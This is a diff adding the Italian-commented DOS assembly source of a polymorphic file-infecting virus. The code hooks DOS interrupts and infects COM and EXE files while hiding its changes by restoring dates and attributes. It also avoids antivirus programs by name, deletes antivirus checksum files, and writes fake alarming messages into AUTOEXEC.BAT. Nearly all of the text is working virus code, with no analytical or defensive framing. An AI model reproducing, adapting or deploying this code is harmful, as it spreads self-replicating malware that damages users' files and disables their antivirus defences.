+        jnc scrivi_keyb
+        ret                       ; Alla fine del
+scrivi_keyb:
+        mov bx,ax                 ; file viene
+        lea dx,[avviso+bp]
+        mov cx,28                 ; posto il
+        mov ah,40h
+        int 21h                   ; contatore di
+        mov cx,5
+fill:   push cx                   ; una word
+        lea dx,[dati+bp]
+        mov cx,18                 ; inizializzato
+        mov ah,40h
+        int 21h                   ; a zero.
+        inc cs:byte_k+bp
+        pop cx
+        loop fill
+        lea dx,[duzeri+bp]
+        mov cx,2
+        mov ah,40h
+        int 21h
+        mov ah,3eh
+        int 21h                   ; Se invece 
+        ret
+        duzeri    dw 0            ; il file
+        contatore dw 0
+leggi:  push cs                   ; esiste,
+        pop ds
+        mov bx,ax                 ; ne viene 
+        call keypunt
+        mov ah,3fh                ; letto il 
+        lea dx,[contatore+bp]
+        push dx                   ; contatore,
+        mov cx,2
+        int 21h                   ; incrementato di
+        inc cs:contatore+bp
+        cmp cs:contatore+bp,end_noise
+        jb unlim
+        mov cs:contatore+bp,start_noise-pausa
+unlim:  call keypunt
+        pop dx                    ; uno e
+        mov ah,40h
+        mov cx,2                  ; riscritto nel file.
+        int 21h
+        mov ah,3eh
+        int 21h
+        ret
+keypunt:
+        xor cx,cx
+        mov dx,118
+        mov ax,4200h
+        int 21h
+        ret
+;-----------------------Inizializzazione del contatore-----------------------
+        disturbo dw 0
+        on_off db 0
+inizial:
+        push es
+        push cs
+        pop es
+        lea di,[uff+bp]
+        mov cx,30                    ; Se Š arrivato
+        cld
+        xor ax,ax                    ; il momento
+uffi:   stosw
+        loop uffi                    ; di far
+        pop es
+        mov cs:detto+bp,0            ; partire i
+        call random
+        mov bx,ritardo_M             ; disturbi,
+        sub bx,ritardo_x
+        xor dx,dx                    ; si calcola
+        div bx
+        mov cs:orario+bp,ritardo_x   ; il ritardo 
+        add cs:orario+bp,dx
+        mov cs:alt+bp,2              ; di attivazione
+        mov cs:vel+bp,1
+        mov cs:basta+bp,0            ; sommando un
+        mov cs:posiz+bp,0
+        mov cs:riga+bp,0             ; valore a caso
+        mov cs:prem+bp,0
+        mov cs:numtas+bp,0           ; al ritardo minimo
+        mov cs:ottava+bp,5
+        mov cs:dove+bp,offset god
+        mov cs:nomc+bp,0
+;-----------------------Inizializzazione del ciclo dei vermi-----------------
+        push cs
+        pop ds
+        push cs
+        pop es
+        mov cx,22                   ; Il disturbo dei VERMI
+        lea di,[vita+bp]  
+init:   push cx                     ; ha bisogno
+        mov cx,bufverme
+        lea si,[verme+bp]           ; di una inizializzazione
+        rep movsb
+        pop cx                      ; particolare
+        loop init
+        ret
+;-----------------------Buffer di stronzate varie...-------------------------
+        frasi:
+        db 0dh,0ah  
+        db 0dh,0ah,'@echo ',7,'Your keyboard has expired its evaluation'
+        db ' period!',0dh,0ah,'@echo Please, register to'
+        db ' Microsoft(c) Corporation.',0dh,0ah,'@pause',0dh,0ah
+        frase_e:
+
+
+        db 0dh,0ah
+        db 0dh,0ah,'@echo ',7,'Found hardware error on video card (code'
+        db ' 23001):',0dh,0ah,'@echo Please, move your m'
+        db 'onitor and reboot the PC. ',0dh,0ah,'@pause',0dh,0ah
+
+
+        db 0dh,0ah
+        db 0dh,0ah,'@echo ',7,'Found error: ah ah ah ah... eh eh eh eh.'
+        db '......  ',0dh,0ah,'@echo uh uh uh uh....    '
+        db ' Dr.SCSI & Mr.IDE         ',0dh,0ah,'@pause',0dh,0ah
+
+
+        db 0dh,0ah
+        db 0dh,0ah,'@echo ',7,'Your Hard Disk is boring to live...     '
+        db '        ',0dh,0ah,'@echo Youthanasia will st'
+        db 'art now... (formatting C:)',0dh,0ah,'@pause',0dh,0ah
+
+
+        db 0dh,0ah
+        db 0dh,0ah,'@echo ',7,'Found Boot error: replace the TORPINO Ca'
+        db 'rd      ',0dh,0ah,'@echo and reboot the syst'
+        db 'em immediately !          ',0dh,0ah,'@pause',0dh,0ah
+
+
+        db 0dh,0ah
+        db 0dh,0ah,'@echo ',7,'This message is a property of F-PROT Ant'
+        db 'ivirus: ',0dh,0ah,'@echo Please, contact Fri'
+        db 'drick for more info...    ',0dh,0ah,'@pause',0dh,0ah
+
+
+        nome_auto db 'C:\AUTOEXEC.BAT',0
+        frasen    dw ?
+        volte     dw ?
+;-----------------------'Iniettore' di stronzate...--------------------------
+auto_in:
+        mov cs:frasen+bp,dx
+        call g_volte                 ; Il file
+        push cs
+        pop ds                       ; AUTOEXEC.BAT
+        mov ax,3d02h
+        lea dx,[nome_auto+bp]        ; viene aperto,
+        int 21h
+        jnc auto_a                   ; puntato alla fine,
+        ret
+auto_a: mov bx,ax                    ; e riempito con
+        mov ax,4202h
+        xor cx,cx                    ; un numero variabile
+        xor dx,dx
+        int 21h                      ; a caso della frase
+        lea dx,[frasi+bp]
+        push dx bx                   ; scelta a caso
+        mov ax,cs:frasen+bp
+        xor dx,dx                    ; in precedenza
+        mov bx,dimfrase
+        mul bx
+        pop bx dx
+        add dx,ax
+        mov cx,cs:volte+bp
+wrau:   push cx
+        mov ah,40h
+        mov cx,dimfrase
+        int 21h
+        pop cx
+        loop wrau
+        mov ah,3eh
+        int 21h
+        ret
+g_volte:
+        call random                 ; Qui si decide
+        xor dx,dx
+        mov bx,30                   ; quante volte 
+        div bx
+        add dx,20                   ; scrivere la frase
+        mov cs:volte+bp,dx
+        ret
+;-----------------------Codici operativi dello switch------------------------
+        ; da spostare in cs virus offset 10h
+pspex:
+        ;dos 10h
+        db 2eh,80h,3eh,40h,00h,00h,75h,03h,0e9h
+        newdos   dw ?               ;offset mydos-3-18h
+        db 0eah
+        ordosoff dw ?
+        ordosseg dw ?
+
+
+        ;tim 20h
+        db 2eh,80h,3eh,40h,00h,00h,75h,03h,0e9h
+        newtim   dw ?               ;offset mytim-3-28h
+        db 0eah 
+        ortimoff dw ?
+        ortimseg dw ?
+
+
+        ;tas 30h
+        db 2eh,80h,3eh,40h,00h,00h,75h,03h,0e9h
+        newtas   dw ?               ;offset mytim-3-38h
+        db 0eah
+        ortasoff dw ?
+        ortasseg dw ?
+        db 0                        ;interruttore: 0,acceso 1,spento
+        db 0b0h,03h,0cfh
+pspexfine:
+;-----------------------Puntatore alla prossima vittima----------------------
+        offname    dw ?
+        segname    dw ?
+        offname_di dw ?
+;-----------------------Smistamento delle funzioni DOS-----------------------
+; **************************************************************************
+; <<RECORD MONDIALE>>.....17 FUNZIONI DOS CATTURATE!.....<<RECORD MONDIALE>>
+; **************************************************************************
+mydos:  cmp ax,3098h                    ;Controllo presenza
+        jne ck1
+        cmp dx,0918h
+        jne ck1
+        mov ax,0bcbch
+        iret
+ck1:    cmp ah,9fh                      ;Funzione 'Fucking' Tentacle
+        jne ck2
+        mov ax,4d43h
+        iret
+ck2:    cmp ah,3dh                      ;Apertura di un file
+        jne ck7
+        jmp infdsdx
+ck7:    cmp ah,3ch                      ;Creazione di un file
+        jne ch1
+        jmp openfile
+ch1:    cmp ah,5bh                      ;Creazione di un nuovo file
+        jne ch2
+        jmp openfile
+ch2:    cmp ah,3eh                      ;Chiusura di un file
+        jne ch3
+        jmp closefile
+ch3:    cmp ah,4bh
+        jne no4b
+        inc cs:exe4b
+no4b:   cmp ax,4b00h                    ;Esecuzione di un programma
+        jne ch4
+        jmp infdsxx
+ch4:    cmp ax,4b01h                    ;Overlay di un programma
+        jne ch5
+        jmp infdsxx
+ch5:    cmp ah,43h                      ;Lettura o scrittura attributi
+        je infdsdx
+        cmp ax,7143h                    ;Lettura o scrittura attributi (DOS 7)
+        je infdsdx                      
+        cmp ah,56h                      ;Rinomina un file
+        je infdsdx
+        cmp ax,7156h                    ;Rinomina un file (DOS 7 !)
+        je infdsdx
+        cmp ax,716ch                    ;Apertura interna al DOS 7 !
+        jne ch9
+        jmp infdosi
+ch9:    cmp ah,29h                      ;Analisi della riga di comando
+        jne ck3
+        mov cs:exe4b,0
+        jmp infdssi
+ck3:    cmp ax,6c00h                    ;Apertura interna al DOS
+        jne ck4
+        jmp infdosi
+ck4:    cmp ah,4fh                      ;Ricerca file successivi
+        jne ck6
+        jmp cerca4
+ck6:    cmp ah,4eh                      ;Ricerca il primo file
+        jne ck9
+        jmp cerca4
+ck9:    cmp ah,4ch                      ;Termina un programma
+        jne ch6
+        jmp offprot
+ch6:    cmp ah,0                        ;Chiude un programma
+        jne ch7
+        jmp offprot
+ch7:
+quisu:  jmp cs:old_dos
+;-----------------------Funzioni DOS che puntano a DS:SI---------------------
+infdssi: 
+        mov cs:offname,si
+        jmp nodx
+;-----------------------Comparazione dei nomi--------------------------------
+compara: cld
+        push cx si                      ; Piccola procedura
+        repe cmpsb                      ; che confronta due
+        pop si cx                       ; stringe di lunghezza CX
+        ret
+;-----------------------Estensioni delle vittime----------------------------
+        comminus        db '.com'       ; Estensioni degli
+        commaius        db '.COM'       ; eseguibili DOS
+        exeminus        db '.exe'
+        exemaius        db '.EXE'
+;-----------------------Funzioni DOS che puntano a DS:DX---------------------
+infdsdx:
+        mov cs:offname,dx               ; Salvataggio dell'indirizzo
+nodx:   mov cs:segname,ds               ; del nome del file da
+        pushf                           ; infettare
+        call pushreg
+        mov cs:inopen,0
+;-----------------------Discriminazione file COM ed EXE----------------------
+nodsdx: mov ds,cs:segname
+        mov es,cs:segname
+        mov di,cs:offname
+        xor ax,ax                      ; Ricerca della fine
+        mov cx,255
+        repne scasb                    ; della stringa ASCIIZ
+        sub di,5
+        push cs
+        pop es
+        mov cs:offname_di,di
+        mov cx,4
+        mov si,di
+        mov di,offset comminus         ; Verifica della presenza
+        call compara
+        je its_com                     ; di un file COM
+        mov di,offset commaius
+        call compara
+        je its_com
+        mov di,offset exeminus         ; Verifica della presenza 
+        call compara
+        je its_exe                     ; di un file EXE
+        mov di,offset exemaius
+        call compara
+        je its_exe
+        jmp mydosexit
+;----------------------------------------------------------------------------
+its_com: jmp cominfector
+its_exe:jmp exeinfector
+;-----------------------Il COMMAND.COM non si deve infettare-----------------
+        commandmin db 'command'
+        commandmai db 'COMMAND'
+        dimvittima dw ?
+;-----------------------Uscita dal nostro "sistema operativo"----------------
+mydosexit: 
+        call popreg              ; A seconda di
+        cmp cs:inopen,1
+        je exiret                ; come si Š entrati nel Virus,
+        popf
+        mov cs:alflag,0          ; si torna al DOS
+        jmp cs:old_dos
+exiret: mov cs:inopen,0          ; oppure a chi ha chiamato
+        popf
+        jmp iretx                ; l'INT 21h
+;-----------------------Comparazione del nome COM----------------------------
+cominfector:
+        call disk_space
+        jc disk1
+        jmp mydosexit
+disk1:  mov si,cs:offname_di
+        sub si,7
+        mov cx,7                      ; I file COM
+        mov di,offset commandmin
+        call compara                  ; passano una verifica
+        je  non_command
+        mov di,offset commandmai      ; del nome per evitare di
+        call compara
+        je  non_command               ; infettare il COMMAND.COM
+        jmp infettacom
+non_command:
+        jmp mydosexit
+;-----------------------Chiamata interna al DOS------------------------------
+        flag    dw ?
+        alflag  dw 0               ; Questa routine
+dos:    pushf
+        call cs:old_dos            ; permette al Virus
+        pushf
+        cmp cs:alflag,1            ; di utilizzare le funzioni
+        je noflag
+        popf                       ; DOS e di salvare i flag
+        pushf
+        pop cs:flag                ; in uscita.
+        ret
+noflag: popf
+        ret
+;-----------------------Ritorno da interrupt---------------------------------
+        wo1 dw ?
+        wo2 dw ?                   ; Uscita di "servizio"
+iretx:  pop cs:wo1 cs:wo2
+        popf                       ; con una iret al 
+        push cs:flag
+        push cs:wo2 cs:wo1         ; programma chiamnte
+        mov cs:alflag,0
+        iret
+;-----------------------Routines di servizio---------------------------------
+disk_space:
+        call pushreg
+        mov ds,cs:segname
+        mov si,cs:offname
+        mov al,ds:[si+1]          ; Questa serve a
+        cmp al,':'
+        jne no_drive              ; calcolare lo
+        lodsb
+        or al,20h                 ; spazio libero sul disco
+        sub al,'a'
+        inc al                    ; che ospita la vittima
+        mov dl,al
+        jmp disk_byte
+no_drive:
+        xor dl,dl
+disk_byte:
+        mov ah,36h
+        call dos
+        cmp ax,-1
+        jne valido
+        jmp free
+valido: xor dx,dx
+        mul bx                    ; Qui si calcola 
+        cmp dx,0
+        ja free                   ; se c'Š abbastanza
+        cmp ax,virsect
+        ja free                   ; spazio da permettere
+        clc
+disk_exit:                        ; l'infezione
+        call popreg
+        ret
+free:   stc
+        jmp disk_exit
+
+
+        attrib db ?
+salva_attributo:                  ; Salva gli attributi
+        mov ax,4300h
+        call dos                  ; della vittima e
+        mov cs:attrib,cl
+        mov ax,4301h              ; poi li elimina
+        mov cx,20h
+        call dos
+        ret
+
+
+restore_attributo:
+        mov ax,4301h              ; Ripristina gli
+        mov cl,cs:attrib
+        xor ch,ch                 ; attributi dopo
+        call dos
+        ret                       ; l'infezione
+
+
+        off24 dw ?
+        seg24 dw ?
+        
+no_24:  mov ax,3524h              ; Modifica l'INT 24h
+        call dos
+        mov cs:off24,bx           ; per farlo puntare
+        mov cs:seg24,es
+        push cs                   ; alle istruzioni
+        pop ds
+        mov dx,41h                ; mov al,3  iret
+        mov ax,2524h
+        call dos
+        ret
+        
+        handvittima dw ?
+apri_file:
+        mov ax,3d02h              ; Apre un file 
+        call dos
+        mov cs:handvittima,ax     ; in lettura/scrittura
+        ret
+
+
+p_fine: xor cx,cx
+        xor dx,dx                 ; Porta il puntatore 
+        mov bx,cs:handvittima
+        mov ax,4202h              ; alla fine del file
+        call dos
+        ret
+
+
+p_start: push cx dx bx ax
+        xor cx,cx                 ; Porta il puntatore
+        xor dx,dx
+        mov bx,cs:handvittima     ; all'inizio del file
+        mov ax,4200h
+        call dos
+        pop ax bx dx cx
+        ret
+
+
+leggi_file:
+        mov ah,3fh               ; Legge CX byte 
+        mov bx,cs:handvittima
+        call dos                 ; dal file
+        ret
+
+
+scrivi_file:
+        mov ah,40h               ; Scrive CX byte
+        mov bx,cs:handvittima
+        call dos                 ; nel file
+        ret
+
+
+        bff db 3 dup(0)
+        vermz dw ?
+
+
+verificamz:
+        call p_start
+        mov cx,2                 ; Verifica l'inizio
+        push cs
+        pop ds                   ; del file:
+        mov dx,offset vermz
+        call leggi_file          ; se Š MZ si tratta
+        mov ax,cs:vermz
+        sub ax,5a4eh             ; di un file EXE
+        inc ax
+        ret
+
+
+        ora  dw ?
+        data dw ?
+
+
+salva_data:                     ; Salva la data
+        mov bx,cs:handvittima
+        mov ax,5700h            ; del file da infettare
+        call dos
+        mov cs:ora,cx
+        mov cs:data,dx
+        ret
+
+
+restore_data:
+        mov bx,cs:handvittima   ; Ripristina la data
+        mov cx,cs:ora
+        mov dx,cs:data          ; dopo l'infezione
+        mov ax,5701h
+        call dos
+        ret
+
+
+chiudi_file:                    ; Chiude il
+        mov bx,cs:handvittima
+        mov ah,3eh              ; file dopo l'infezione
+        call dos
+        ret
+
+
+si_24:  mov ax,2524h            ; Ripristina l'INT 24h
+        mov ds,cs:seg24
+        mov dx,cs:off24         ; all'indirizzo originale
+        call dos
+        ret
+marcacom:
+        mov bx,cs:handvittima
+        mov ax,4200h            ; Marca i file
+        push cs
+        pop ds                  ; COM ed EXE
+        mov dx,12h
+        xor cx,cx               ; appena infettati ponendo
+        call dos
+        mov cx,2                ; 0918h all'offset 12h
+        mov dx,offset marca
+        call leggi_file         ; del file
+        mov ax,4200h
+        xor cx,cx
+        mov dx,12h
+        call dos
+        mov cx,2
+        mov dx,offset vermz
+        mov cs:vermz,0918h
+        call scrivi_file
+        ret
+        jmpop db 0e9h
+        offjmp dw 0
+;-----------------------File COM in preparazione...--------------------------
+infettacom:
+        call no_24
+        mov ds,cs:segname
+        mov dx,cs:offname
+        call salva_attributo      ; Preliminari
+        jnc attok
+        jmp attex                 ; per l'infezione:
+attok:  mov ds,cs:segname
+        mov dx,cs:offname         ; salvataggio attributi,
+        call apri_file
+        jnc openok                ; data, ecc.
+        jmp attex2
+openok: call salva_data
+        call verificamz
+        jne verocom               ; Verifica che il file COM
+        jmp veroexe 
+verocom:                          ; sia effetivamente un COM
+        call verificaexe  
+        jne noinfex
+        jmp fileno 
+noinfex:
+        call p_fine
+        cmp dx,0
+        jna dimok
+;-----------------------Fine dei lavori in corso-----------------------------
+fileno: call restore_data
+        call chiudi_file         ; Fase terminale dell'infezione:
+        mov ds,cs:segname
+        mov dx,cs:offname        ; ripristino attributi, data, ecc.
+attex:  call restore_attributo
+attex2: call si_24               ; e chiusura del file
+        jmp mydosexit
+;-----------------------Controllo dimensione---------------------------------
+dimok:  clc
+        mov cs:dimvittima,ax     ; Verifica della dimensione
+        add ax,dimvirus+300h
+        jc fileno                ; del file
+        cmp cs:dimvittima,5000
+        jb fileno
+;-----------------------Ancora lavori in corso...----------------------------
+        call p_start
+        push cs
+        pop ds                   ; Salvataggio dei byte
+        mov dx,offset cop_jmp
+        mov cx,3                 ; sostituiti,
+        call leggi_file
+        mov ax,cs:dimvittima     ; e marcatura
+        sub ax,3
+        mov cs:offjmp,ax         ; di infezione
+        call p_start
+        mov cx,3
+        mov dx,offset jmpop
+        call scrivi_file
+        call marcacom
+;-----------------------"Iniezione" del virus--------------------------------
+        call p_fine
+        add ax,dimdecry+100h
+        mov cs:off,ax
+        call pol
+        mov cs:com_exe,0
+virin:  call p_fine
+        mov al,cs:chiave
+        mov bx,cs:handvittima
+        add cs:off,dimcaos*10
+        mov dx,cs:off
+        mov cs:off_scuro,dx
+        mov cs:al_scuro,18h
+        push cs                  ; Qui il virus
+        pop ds
+        push cs                  ; viene preparato
+        pop es
+        mov di,offset kk         ; per la scrittura
+        mov cx,10
+r_scuro:                         ; nel file:
+        push cx
+        mov si,offset st_scuro   ; si generano le 
+        mov cx,dimcaos
+        cld                      ; istruzioni polimorfiche
+        rep movsb
+        add cs:al_scuro,9        ; e la chiave di
+        pop cx
+        loop r_scuro             ; criptazione
+        inc cs:quanti1
+        adc cs:quanti2,0
+        call fine
+        cmp cs:beep_on,0
+        je nobeep2                   ; *****************
+        mov ax,0e07h                 ; Beep di infezione
+        int 10h                      ; *****************
+nobeep2:
+        call nodat
+        jmp fileno
+;-----------------------Test d'infezione-------------------------------------
+        sign     dw ?
+verificaexe:
+        mov dx,12h
+        xor cx,cx                    ; Prima di 
+        mov ax,4200h
+        call dos                     ; infettare un
+        mov cx,2
+        mov dx,offset sign           ; file si testa
+        push cs
+        pop ds                       ; la marcatura per non
+        call leggi_file
+        cmp cs:sign,0918h            ; reinfettare un file
+        ret
+;-----------------------Analisi dell' EXE------------------------------------
+exeinfector:
+        call disk_space
+        jc disk2
+        jmp mydosexit
+disk2:  mov si,cs:offname_di         ; Particolari
+        sub si,8
+        mov cx,8                     ; nomi dei file
+        mov di,offset dmai      
+        call compara                 ; EXE non devono
+        je  non1        
+        mov di,offset dmin           ; essere infettati:
+        call compara
+        je  non1                     ; gli antivirus
+        mov di,offset vmai
+        inc si                       ; si accorgono
+        dec cx
+        call compara                 ; se i loro
+        je non1
+        mov di,offset vmin           ; eseguibili
+        call compara
+        je non1                      ; vengono modificati
+        mov di,offset fmai
+        dec cx                       ; e danno 
+        inc si
+        call compara                 ; l'allarme
+        je non1
+        mov di,offset fmin
+        call compara
+        je non1
+        mov di,offset smai
+        sub cx,2
+        add si,2
+        call compara
+        je non1
+        mov di,offset smin
+        call compara
+        je non1
+        mov di,offset tmai
+        call compara
+        je non1
+        mov di,offset tmin
+        call compara
+        je non1
+        mov di,offset mmai
+        call compara
+        je non1
+        mov di,offset mmin
+        call compara
+        je non1
+        mov di,offset nmai
+        dec cx
+        inc si
+        call compara
+        je non1
+        mov di,offset nmin
+        call compara
+        je non1
+        jmp infettaexe
+non1:   jmp mydosexit
+;-----------------------Infezione dell' EXE----------------------------------
+infettaexe:
+        call no_24
+        mov ds,cs:segname
+        mov dx,cs:offname            ; Come per
+        call salva_attributo
+        jnc attok2                   ; i file COM,
+        jmp attex2
+attok2: mov ds,cs:segname            ; anche per gli
+        mov dx,cs:offname
+        call apri_file               ; EXE si provvede
+        jnc openok2
+        jmp attex                    ; a conservare
+openok2: call salva_data
+        call verificamz              ; la data e
+        je veroexe
+        jmp verocom                  ; gli attributi
+veroexe: call p_fine
+        cmp dx,0
+        jne dimok2
+        cmp ax,5000
+        ja dimok2                    ; Controllo della
+        jmp fileno
+dimok2: call verificaexe             ; dimensione
+        jne noinfex2
+        jmp fileno                   
+noinfex2: jmp exefuck
+;-----------------------Header dei file EXE----------------------------------
+        exe     dw ?
+        resto   dw ?
+        pagine  dw ?                ; Le informazioni
+        reloc   dw ?
+        header  dw ?                ; essenziali dei
+        minpar  dw ?
+        maxpar  dw ?                ; file EXE 
+        exe_ss  dw ?
+        exe_sp  dw ?                ; sono conservate
+        cecksum dw ?
+        exe_ip  dw ?                ; tutte nell'intestazione
+        exe_cs  dw ?
+        riloc   dw ?                ; o "header"
+;-----------------------Costanti per vari calcoli----------------------------
+        pag     dw 512
+        par     dw 16
+        alta    dw 1000h
+        altapag dw 80h
+        zero    db 0
+;-----------------------EXE da non infettare---------------------------------
+        dmai    db "VIRSTOP2"
+        dmin    db "virstop2"
+        vmai    db "VIRSTOP"
+        vmin    db "virstop"        ; Questi sono i
+        fmai    db "F-PROT"
+        fmin    db "f-prot"         ; nomi degli antivirus
+        smai    db "SCAN"
+        smin    db "scan"           ; da non infettare
+        tmai    db "TBAV"
+        tmin    db "tbav"
+        mmai    db "XXXX"
+        mmin    db "xxxx"
+        nmai    db "NAV"
+        nmin    db "nav"
+;-----------------------Controllo per i PK-Lite------------------------------
+vedibene:
+        mov dx,1eh
+        xor cx,cx                   ; Un file EXE
+        mov ax,4200h
+        mov bx,cs:handvittima       ; compresso con il PKLITE
+        call dos
+        mov cx,2                    ; potrebbe apparire
+        mov dx,offset vermz
+        push cs                     ; come file per Windows.
+        pop ds
+        call leggi_file             ; Qui si verifica...
+        cmp cs:vermz,'KP'
+        ret
+;-----------------------Calcoli dimensione, paragrafi, ecc.------------------
+exefuck: call p_start
+        mov cx,26
+        mov dx,offset exe
+        push cs
+        pop ds
+        call leggi_file
+        cmp cs:riloc,40h
+        jb nowin                    ; L'ultima cosa
+        call vedibene
+        je nowin                    ; che mi va
+        jmp fileno
+nowin:  mov ax,cs:pagine            ; di fare adesso
+        dec ax
+        mul pag                     ; Š spiegare
+        add ax,cs:resto
+        adc dx,0                    ; quali calcoli
+        mov cs:exel,ax
+        mov cs:exeh,dx              ; si fanno
+        call p_fine
+        cmp ax,cs:exel              ; per infettare
+        je lok
+        jmp fileno                  ; un file EXE
+lok:    cmp dx,cs:exeh
+        je hok
+        jmp fileno
+hok:    mov ax,cs:exe_cs
+        mov cs:old_cs,ax
+        mov ax,cs:exe_ip
+        mov cs:old_ip,ax
+        mov ax,cs:exe_ss
+        mov cs:old_ss,ax
+        mov ax,cs:exe_sp
+        mov cs:old_sp,ax
+        mov ax,cs:header
+        mul par
+        sub cs:exel,ax
+        sbb cs:exeh,dx                                  
+        mov ax,cs:exeh
+        mul alta                   ; Si devono 
+        mov bx,ax
+        mov ax,cs:exel             ; sottrarre 15 
+        xor dx,dx
+        div par                    ; paragrafi all entry-point
+        add ax,bx
+        sub ax,15         ; <<-------- PerchŠ 15 ???          
+        mov cs:exe_cs,ax
+        add ax,parvirus+10h
+        mov cs:exe_ss,ax
+        mov bx,16 
+        sub bx,dx
+        mov cs:tamp,bx
+        mov cs:cecksum,0918h
+        mov cs:exe_ip,100h
+        mov cs:exe_sp,200h
+        add cs:minpar,parvirus
+        call p_fine
+        add ax,cs:tamp
+        adc dx,0
+        add ax,dimvirus
+        adc dx,0
+        push ax
+        mov ax,dx
+        mul altapag
+        mov bx,ax
+        pop ax   
+        xor dx,dx
+        div pag
+        add ax,bx
+        cmp dx,0
+        je noresto
+        inc ax
+noresto: mov cs:pagine,ax
+        mov cs:resto,dx
+        mov cs:com_exe,1
+        call p_start
+        mov cx,26
+        mov dx,offset exe
+        call scrivi_file
+        call p_fine
+        mov cx,cs:tamp
+        jcxz nozin
+zeroin: push cx
+        mov dx,offset zero
+        mov cx,1
+        call scrivi_file
+        pop cx
+        loop zeroin
+nozin:  call p_fine
+        mov cs:off,offset chiaro
+        call pol
+        jmp virin
+;-----------------------Eliminazione dei file di checksum--------------------
+datbuff db 64 dup(0)
+datname db 'ANTI-VIR.DAT',0
+msname  db 'CHKLIST.MS',0
+tbname  db 'ANTI-VIR.DAT',0
+nodat:  push cs
+        pop ds                      ; Gli antivirus MSAV
+        push cs
+        pop es                      ; e TBAV
+        mov si,offset tbname
+        mov di,offset datname       ; creano un file di
+        mov cx,13
+        push di                     ; checksum per
+        rep movsb                    
+        call delfil                 ; gli eseguibili:
+        pop di
+        mov si,offset msname        ; qui vengono puntualmente
+        mov cx,11
+        rep movsb                   ; eliminati...
+        call delfil
+        ret
+delfil: mov ds,cs:segname
+        mov si,cs:offname
+        push cs
+        pop es
+        mov cx,64
+        mov di,offset datbuff
+        push di
+        cld
+        rep movsb
+        pop di
+        xor ax,ax
+        mov cx,65                   ; Per eliminare
+        repne scasb
+        dec di                      ; questi file
+        std
+        mov al,'\'                  ; si deve
+seek:   scasb
+        je slash                    ; ricostruire il 
+        cmp di,offset datbuff
+        je slash                    ; path completo
+        cmp byte ptr cs:[di],':'
+        je slash                    ; della posizione del
+        jmp seek
+slash:  add di,2                    ; file vittima
+        push cs
+        pop ds
+        mov cx,13         
+        mov si,offset datname
+        cld
+        rep movsb
+        mov dx,offset datbuff
+        mov ax,4301h
+        xor cx,cx
+        call dos
+        mov ah,41h
+        call dos
+        ret
+;-----------------------Dimensione effettiva dell'EXE------------------------
+        exel dw ?
+        exeh dw ?
+        tamp dw ?
+;-----------------------Determinazione del modo video------------------------
+mvideo: mov ah,0fh
+        int 10h
+        cmp al,3
+        ret
+;-----------------------Questo Š il nostro Timer-----------------------------
+        orario dw 0
+mytim:  pushf
+        cmp cs:on_off,1
+        je attivo                   ; Qui giunge
+        jmp extim
+attivo: cmp cs:orario,0             ; la chiamta del Timer
+        je scatta
+        dec cs:orario               ; di sistema...
+        jmp extim
+scatta: call tim_noise
+extim:  popf
+        jmp cs:old_tim
+;--------------------------Disturbi della prima fase-------------------------
+noises: call noise_numeri
+        ret
+        call noise_vocali
+        ret
+        call noise_lento
+        ret
+;--------------------------Disturbi della seconda fase-----------------------
+        call noise_vermi  
+        ret
+        call noise_casca
+        ret
+        call noise_inpiu            
+        ret
+        call noise_nome
+;----------------------------------------------------------------------------
+offsb:  cmp cs:numtas,4
+        je offx                     ; Non mi ricordo
+        ret
+offx:   cmp cs:sbg,0                ; pi— a che servono
+        je susb
+        dec cs:sbg                  ; queste istruzioni...
+        ret
+susb:   call reset
+        ret
+;-----------------------Timer durante l'attivazione--------------------------
+tim_noise:
+        call pushreg
+        call offsb                  ; Selezione del
+        cmp cs:detto,0
+        je decidi                   ; disturbo da attrivare
+        jmp scambo
+decidi: mov cx,offset noises     ;****************
+        mov ax,cs:disturbo
+        mov bx,4                 ;****************
+        xor dx,dx
+        mul bx
+        add cx,ax
+        jmp codaf
+codaf:  mov cs:quale,cx
+        mov cs:detto,1              ; Chiamata al
+        jmp scambo
+scambo: call cs:quale               ; disturbo selezionato
+nonois: call popreg
+        ret
+        detto db 0
+        quale   dw ?
+;-----------------------Noisex: Visualizzazione del nome---------------------
+        primo   db 0
+        nomc    dw 0
+        unos    db 0
+        colore  db 34h             ; Questi dati
+        letn    db 32
+        frase   dw ?               ; servono al disturbo
+        videop  dw ?
+        righe   db 7               ; del NOME per
+        swrig   db 0
+        dues    db 0               ; lavorare in "multitasking"...
+        waix    dw 0
+        nota    dw offset music
+        durat   dw 0
+        pausm   dw 0
+        onpl    dw 0
+        calma   dw 500
+        voltx   db 3
+
+
+;-------------------La "Warner Virus" Š lieta di presentarvi...--------------
+music   dw 9,e,3,0,d,1,0,1,c,2,0,2,d,2,0,e,2,0,d$,2,0,e,2,0,1,c,2,0,2,d,2,0
+        dw d,2,0,d,2,0,d,10,2
+        dw d,3,0,1,c,1,0,b,2,0,c,2,0,2,d,2,0,1,c,2,0,2,d,2,0,1,b,2,0,c,2,0
+        dw c,2,0,c,2,0,c,10,2
+        dw 1,g,2,1,2,a,2,1,1,g,2,1,2,a,2,1,d,2,1,d,2,1,d,8,0
+        dw 1,g,2,1,2,a,2,1,1,g,2,1,2,a,2,1,1,c,2,1,c,2,1,c,10,10
+        dw 0,0,0
+                                                ; Coded By GMZ
+;-----------------------Ecco il nostro MIDI Player---------------------------
+audio:  cmp cs:onpl,1
+        jne sbcol
+        ret
+sbcol:  cmp cs:durat,0
+        je cpas
+        dec cs:durat
+        jz offn
+        ret
+offn:   mov al,0
+        mov bl,0b0h
+        call sbscrivi
+        ret
+cpas:   cmp cs:pausm,0
+        je comi
+        dec cs:pausm
+        ret
+comi:   push cs
+        pop ds
+        mov si,cs:nota
+relno:  lodsw
+        cmp ax,0
+        jne nn1
+        call reset
+        dec cs:voltx
+        jz stop
+        mov cs:nota,offset music
+        ret
+stop:   mov cs:onpl,1
+        ret
+nn1:    cmp ax,1
+        jne nn2
+        dec cs:ottava
+        mov cs:nota,si
+        jmp relno
+nn2:    cmp ax,2
+        jne nn3 
+        inc cs:ottava
+        mov cs:nota,si
+        jmp relno
+nn3:    cmp ax,9
+        jne suox
+        call reset
+        mov cs:ottava,5
+        mov cs:msb,0
+        mov cs:lsb,0
+        call iniz
+        mov cs:nota,si
+        ret
+suox:   call play2
+        lodsw
+        mov cs:durat,ax
+        lodsw
+        mov cs:pausm,ax
+        mov cs:nota,si
+        ret
+Noise_nome: ;--------------------NOISE NOME----------------------------------
+        cmp cs:nomc,5*1092
+        je wnome
+        inc cs:nomc
+        cmp cs:nomc,5*1092-2
+        jne nomix
+        push cs
+        pop ds
+        mov si,offset mixer
+        mov cx,6
+resmix: lodsw
+        mov dx,ax
+        lodsw
+        out dx,al
+        push cx
+        mov cx,10
